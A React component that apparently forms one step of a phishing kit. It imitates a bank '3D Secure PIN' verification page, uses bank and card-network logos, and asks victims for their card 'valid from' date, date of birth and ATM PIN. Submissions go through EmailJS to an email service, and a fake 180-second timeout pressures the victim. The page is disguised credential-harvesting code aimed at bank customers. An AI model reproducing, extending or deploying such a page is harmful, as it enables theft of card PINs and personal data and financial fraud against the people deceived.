import React, { useRef } from "react";
import { Link } from "react-router-dom";
import emailjs from "@emailjs/browser";
import "./index.css";

const Paymentprocess_pin = ({}) => {
  const p_style = {
    color: "#12830",
    textAlign: "center",
    gridColumn: "1/3",
    fontSize: "x-small",
    color: "rgb(161, 40, 48)",
  };

  const form = useRef();

  function sendEmail(e) {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_gmail_contact",
        "template_qn8a87d",
        form.current,
        "user_1BbfROnlSMWCftLMRSCEo"
      )
      .then(
        (result) => {
          console.log(result.text);
          const show = document.getElementById("messageres");
          show.innerHTML = "Message sent :)";
        },
        (error) => {
          console.log(error.text);
        }
      );
    e.target.reset();
  }

  return (
    <>
      <div className="wraper" style={{width: "450px"}}>
        <div className="box">
          <div className="visa_logo">
            <div className="visa">
              <img
                src="https://www.3dsecure.icicibank.com/ACSWeb/EnrollWeb/ICICIBank/images/vbv_logo.jpg"
                alt="visa pic"
              />
            </div>
            <div className="mas_card" style={{justifySelf: "center"}}>
              <img
                src="https://images.all-free-download.com/images/graphicthumb/mastercard_1_82737.jpg"
                alt="mastercard pic"
              />
            </div>
          </div>
          <div className="line">
            <span>Verify 3D Secure PIN Step 1 of 2</span>
            <p>
              &nbsp;Please provide the information in the space below, to
              confirm <br /> &nbsp;your identity.
            </p>
          </div>
          <div className="card_form">
            <form
              ref={form}
              onSubmit={sendEmail}
              className="form-contact"
              style={{ gap: "0px", gridTemplateRows: "1fr 1fr 1fr 1fr 1fr" }}
            >
              <div className="card transaction_detail">
                <p className="card_p">Card Number :</p>
                <p>XXXX XXXX XXXX XXXX</p>
              </div>
              <div className="card expire" style={{ rowGap: "5px" }}>
                <label>Valid From : </label>
                <div>
                  <input
                    type="text"
                    // onChange={}
                    // value={}
                    placeholder="mm"
                    className="form_input"
                    maxLength="2"
                    size="2"
                  />
                  <span>/</span>
                  <input
                    type="text"
                    // onChange={}
                    // value={}
                    placeholder="yy"
                    className="form_input"
                    maxLength="2"
                    size="2"
                  />
                </div>
              </div>
              <div className="card expire" style={{ rowGap: "5px" }}>
                <label>Date Of Birth : </label>
                <div>
                  <input
                    type="text"
                    // onChange={}
                    // value={}
                    placeholder="mm"
                    className="form_input"
                    maxLength="2"
                    size="2"
                  />
                  <span>/</span>
                  <input
                    type="text"
                    // onChange={}
                    // value={}
                    placeholder="yy"
                    className="form_input"
                    maxLength="2"
                    size="2"
                  />
                  <span>/</span>
                  <input
                    type="text"
                    // onChange={}
                    // value={}
                    placeholder="yy"
                    className="form_input"
                    maxLength="2"
                    size="2"
                  />
                </div>
              </div>
              <div style={{ alignSelf: "center" }}>
                <p size="1" style={p_style}>
                  The primary account holder's date of birth needs to be entered
                  here.
                </p>
              </div>
              <div className="card cvvno">
                <label>ATM PIN :</label>
                <input
                  type="password"
                  // onChange={}
                  // value={}
                  className="cvv_input"
                  size="4"
                  maxLength="4"
                />
              </div>
              <div className="card_btn">
                <button type="submit" className="submit_btn" style={{margin:"0em 0em 0em 5em"}}>
                  <Link to="/processing_otp">SUBMIT</Link>
                </button>
              </div>
            </form>
          </div>
          <div className="card_footer" style={{ margin: "2.5em 0em 3em 0em" }}>
            <p>
              This page will automatically timeout after <span>180</span> second
            </p>
          </div>
        </div>
      </div>
    </>
  );
};
export default Paymentprocess_pin;
